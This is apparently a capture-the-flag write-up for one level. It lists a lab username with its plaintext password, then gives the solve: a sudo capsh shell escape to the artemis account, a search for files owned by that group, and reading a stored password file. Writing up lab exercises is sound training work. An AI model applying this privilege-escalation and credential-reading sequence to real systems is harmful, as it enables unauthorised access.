# username
arete
# password
QjrIovHacmGWxVjXRLmA
# mission contents
The user artemis allows us to use some binary on her behalf. Its a gift...
# method of solve
We are given `sudo` permissions as the `artemis` user with the `/sbin/capsh` binary. The privilege escalation method is well known, and can be found on the `gtfobins` website
```
sudo -l
sudo -u artemis capsh --
find / -group artemis 2>/dev/null | grep -v proc
cat /usr/share/artemis_pass.txt
```
